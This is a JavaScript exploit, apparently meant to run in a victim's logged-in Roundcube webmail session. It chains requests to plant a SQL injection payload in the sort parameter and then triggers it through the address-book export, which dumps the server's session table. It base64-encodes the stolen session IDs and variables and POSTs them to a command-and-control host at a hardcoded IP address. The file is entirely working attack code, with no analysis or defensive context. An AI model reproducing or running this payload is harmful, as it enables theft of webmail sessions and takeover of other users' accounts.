let csrf = rcmail.env.request_token;

let c2 = "http://192.168.1.2:8181"
let sqli_payload = `1=1 UNION SELECT *,"nam","sau","bay",CONCAT("BEGIN:VCARD\\r\\nVERSION:3.0\\r\\nN:;SESSID-",\`a\`,";;;\\r\\nFN:VARS-",\`d\`,"\\r\\nEND:VCARD"),"chin","muoi" FROM (SELECT 'a','b','c','d' UNION SELECT * FROM session)b;#`

fetch(
		`/webmail/?_task=mail&_action=list&_mbox=INBOX&_remote=1&_sort=${sqli_payload}`, {
			credentials: "include"
		}
	)
	.then((response) => {
		if (!response.ok) {
			throw new Error("Polluting $_SESSION with our sort value failed.");
		}
		return;
	})
	.then(() => {
		return fetch(
			"/webmail/?_task=mail&_action=search&_interval=&_q=Papa&_filter=ALL&_scope=base&_mbox=INBOX&_remote=1", {
				credentials: "include"
			}
		);
	})
	.then((response) => {
		if (!response.ok) {
			throw new Error(
				"Setting $_SESSION['search'] with our sort value failed."
			);
		}
		return fetch(
				`/webmail/?_task=addressbook&_source=0&_action=export&_token=${csrf}&_search=3`, {
				credentials: "include"
			}
		);
	})
	.then((response) => {
		if (!response.ok) {
			throw new Error("Triggering the SQLi failed.");
		}
		return response.text();
	})
	.then((text) => {
		fetch(c2 + "/store", {
			method: "POST",
			body: JSON.stringify({
				data: btoa(text)
			}),
			mode: "no-cors",
		});
	})
	.catch((error) => {
		fetch(c2 + "/error", {
			method: "POST",
			body: JSON.stringify({
				error: error.message
			}),
			mode: "no-cors",
		});
	});
